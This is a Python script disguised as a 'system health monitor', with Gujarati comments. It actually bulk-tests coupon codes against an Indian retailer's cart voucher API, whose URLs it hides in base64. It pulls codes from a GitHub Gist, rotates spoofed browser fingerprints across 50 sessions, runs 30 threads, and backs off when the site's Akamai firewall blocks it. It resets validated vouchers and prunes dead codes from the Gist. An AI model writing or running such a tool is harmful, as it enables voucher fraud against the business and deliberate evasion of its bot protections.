import json
import time
import os
import requests # Fakta GitHub API (Gist Sync) mate
import sys
import logging
import base64
import random
import threading
import concurrent.futures
from datetime import datetime, timezone, timedelta

# --- TURBO STEALTH ENGINE ---
try:
    from curl_cffi import requests as crequests
except ImportError:
    print(" [SYS_ERR] Jaruri module 'curl_cffi' nathi malyo.")
    sys.exit(1)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [SYSTEM] %(message)s')
logger = logging.getLogger(__name__)

# Indian Standard Time (IST) nu setting
IST = timezone(timedelta(hours=5, minutes=30))

def get_ist():
    """IST na hisab thi current time aap she"""
    return datetime.now(IST).strftime('%H:%M:%S.%f')[:-3]

# Alag alag browser na fingerprints (Nava ane vadhu add karya chhe)
FINGERPRINTS = [
    "chrome99", "chrome104", "chrome110", "chrome114", "chrome116", 
    "chrome119", "chrome120", "chrome124",
    "edge99", "edge101", "edge114",
    "safari15_3", "safari15_5", "safari16_0", "safari17_0"
]

class SystemHealthMonitor:
    def __init__(self):
        self.config_str = os.environ.get('APP_CONFIG') 
        self.log_id = os.environ.get('LOG_ID')         
        self.api_key = os.environ.get('API_KEY')       
        
        self.cookie_string = ""
        self.start_time = time.time()
        self.MAX_DURATION = 21000 # ~6 kalak ni limit
        
        # --- Multi-Threading Mate Safety ---
        self.sessions = []
        self.lock = threading.Lock()
        self.keep_data = []
        self.consecutive_errors = 0
        self.corruption_detected = False
        self.global_pause = False # Akamai block kare to badha ne roki devanu

        if not self.log_id or not self.api_key:
            print(f"[{get_ist()}]  [SYS_ERR] Config (ID/KEY) khute chhe. Bandh thai rahyu chhe.")
            sys.exit(1)

    def _d(self, s):
        """Base64 string ne decrypt karva mate"""
        return base64.b64decode(s).decode('utf-8')

    def load_config(self):
        if not self.config_str: return ""
        try:
            cookie_dict = json.loads(self.config_str)
            return "; ".join(f"{k}={v}" for k, v in cookie_dict.items())
        except: return ""

    def setup_session(self):
        self.cookie_string = self.load_config()
        if not self.cookie_string:
            return False
            
        # --- Speed mate pehle thi j 50 session tayar rakhsho ---
        for _ in range(50): 
            fp = random.choice(FINGERPRINTS)
            session = crequests.Session(impersonate=fp)
            session.headers.update({
                "accept": "application/json",
                "content-type": "application/json",
                "origin": self._d("aHR0cHM6Ly93d3cuc2hlaW5pbmRpYS5pbg=="),
                "referer": self._d("aHR0cHM6Ly93d3cuc2hlaW5pbmRpYS5pbi9jYXJ0"),
                "x-tenant-id": self._d("U0hFSU4="), 
                "cookie": self.cookie_string
            })
            self.sessions.append(session)
            
        return True

    # --- GITHUB GIST SYNC ---
    def fetch_logs(self):
        headers = {"Authorization": f"token {self.api_key}"}
        try:
            r = requests.get(f"https://api.github.com/gists/{self.log_id}", headers=headers, timeout=10)
            r.raise_for_status()
            files = r.json()['files']
            filename = list(files.keys())[0] 
            content = files[filename]['content']
            return [line.strip() for line in content.split('\n') if line.strip()], filename
        except Exception as e:
            print(f"[{get_ist()}]  [CLOUD_ERR] Data lav va ma bhul: {e}")
            return [], ""

    def update_logs(self, valid_list, filename):
        headers = {"Authorization": f"token {self.api_key}"}
        new_content = "\n".join(valid_list)
        payload = {"files": {filename: {"content": new_content}}}
        try:
            requests.patch(f"https://api.github.com/gists/{self.log_id}", json=payload, headers=headers)
            print(f"[{get_ist()}]  [CLOUD_SYNC] Data saaf kari ne upload thai gayo chhe.")
        except: pass

    # --- TURBO CHECK ENGINE (curl_cffi) ---
    def ping_endpoint(self, code):
        url = self._d("aHR0cHM6Ly93d3cuc2hlaW5pbmRpYS5pbi9hcGkvY2FydC9hcHBseS12b3VjaGVy")
        payload = {"voucherId": code, "device": {"client_type": "web"}}
        
        # Ek random session pakdo
        session = random.choice(self.sessions)
        
        try:
            resp = session.post(url, json=payload, timeout=8)
            
            # 403 Block nu dhyan rakho
            if resp.status_code in [403, 429]:
                return {"status_code": resp.status_code}
                
            return resp.json()
        except Exception:
            return None

    def reset_endpoint(self, code):
        """ Pachal thi (background ma) reset karse jethi speed na ghate """
        url = self._d("aHR0cHM6Ly93d3cuc2hlaW5pbmRpYS5pbi9hcGkvY2FydC9yZXNldC12b3VjaGVy")
        payload = {"voucherId": code, "device": {"client_type": "web"}}
        session = random.choice(self.sessions)
        try:
            session.post(url, json=payload, timeout=2) 
        except: pass

    def trigger_background_reset(self, code):
        threading.Thread(target=self.reset_endpoint, args=(code,), daemon=True).start()

    def analyze_signal(self, data):
        if not data: return "NET_ERR"
        
        if "status_code" in data: return "BLOCK" 
        
        if "errorMessage" in data:
            errors = data.get("errorMessage", {}).get("errors", [])
            for error in errors:
                msg = error.get("message", "").lower()
                if "cart" in msg and ("found" in msg or "empty" in msg): return "AUTH_FAIL"
                if "redeem" in msg or "limit" in msg or "used" in msg: return "ARCHIVED"
                if "not applicable" in msg or "not exist" in msg or "invalid" in msg: return "CORRUPT"
            return "CORRUPT"
        return "OK"

    def _worker(self, item):
        """ Ek sathe coupon check karva mate nu logic """
        masked = item[:3] + "*****" 
        
        # 1. Jo server gusse ma hoy to thodi vaar uha raho
        if self.global_pause:
            time.sleep(10)
            
        with self.lock:
            if self.consecutive_errors >= 5: 
                self.global_pause = True
                print(f"[{get_ist()}]  [🛡️ WAF ALERT] Server a rokya chhe. 10 second mate shant raho...")
                time.sleep(10)
                self.consecutive_errors = 0
                self.global_pause = False

        # 2. Ramdom time wait karo jethi lagatar request na jay (0.2s - 0.5s)
        time.sleep(random.uniform(0.2, 0.5))

        resp = self.ping_endpoint(item)
        status = self.analyze_signal(resp)
        
        # Ek pan coupon miss na thavo joiye
        with self.lock:
            ts_end = get_ist()
            if status == "OK":
                print(f"[{ts_end}]    [OK] Sachi coupon mali: {masked}")
                self.trigger_background_reset(item) 
                self.keep_data.append(item)
                self.consecutive_errors = max(0, self.consecutive_errors - 1) 
            
            elif status == "ARCHIVED":
                print(f"[{ts_end}]    [WARN] Juni coupon: {masked}")
                self.trigger_background_reset(item) 
                self.keep_data.append(item)
                self.consecutive_errors = max(0, self.consecutive_errors - 1)
            
            elif status == "CORRUPT":
                print(f"[{ts_end}]    [ERR] Kharap coupon che: {masked} -> Kadhi didhi")
                self.corruption_detected = True 
            
            elif status == "AUTH_FAIL":
                print(f"[{ts_end}]  [CRITICAL] Session Token puru thai gayu.")
                os._exit(1) 
            
            elif status == "BLOCK":
                print(f"[{ts_end}]    [BLOCKED] Server a block karyu: {masked}")
                self.keep_data.append(item) 
                self.consecutive_errors += 1
            
            else: # NET_ERR
                self.keep_data.append(item) 
                self.consecutive_errors += 1

    def start_monitoring(self):
        print(f"[{get_ist()}]  [SYS_INIT] System Monitor v8.0 (Vadhu Fingerprints sathe) Chalu thai rahyu chhe...")
        if not self.setup_session(): 
            print(f"[{get_ist()}]  [SYS_ERR] Connection failed.")
            return

        while True:
            # 6 kalak pachi restart
            if time.time() - self.start_time > self.MAX_DURATION:
                print(f"\n[{get_ist()}]  [SYS_MAINTENANCE] Restart thavanu samay thai gayo chhe.")
                break 

            # Data lavo
            current_data, filename = self.fetch_logs()
            
            if not current_data:
                print(f"[{get_ist()}]  [IDLE] Ek pan packet nathi. 60s mate uba raho...")
                time.sleep(60)
                continue

            print(f"\n[{get_ist()}]  [SCAN] {len(current_data)} data packets check thai rahya chhe (Extreme Parallel Speed)...")
            
            self.keep_data = [] 
            self.corruption_detected = False 
            self.consecutive_errors = 0
            self.global_pause = False

            # --- SMART MULTI-THREADING ---
            # 30 workers best chhe. Vadhu fingerprint sathe makkhan ni jem chalse.
            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
                executor.map(self._worker, current_data)

            # Sync Updates
            if self.corruption_detected:
                print(f"\n[{get_ist()}]  [DB_SYNC] Kharap entry kadhi rahya chhe...")
                self.update_logs(self.keep_data, filename)
                print(f"[{get_ist()}]  [SYS] Data safai thai gai. Fari thi check sharu karie chhiye...")
                time.sleep(5) 
            else:
                print(f"[{get_ist()}]  [SYS] System shant chhe. Nava round mate 1s thobho...")
                time.sleep(1)

if __name__ == "__main__":
    monitor = SystemHealthMonitor()
    monitor.start_monitoring()
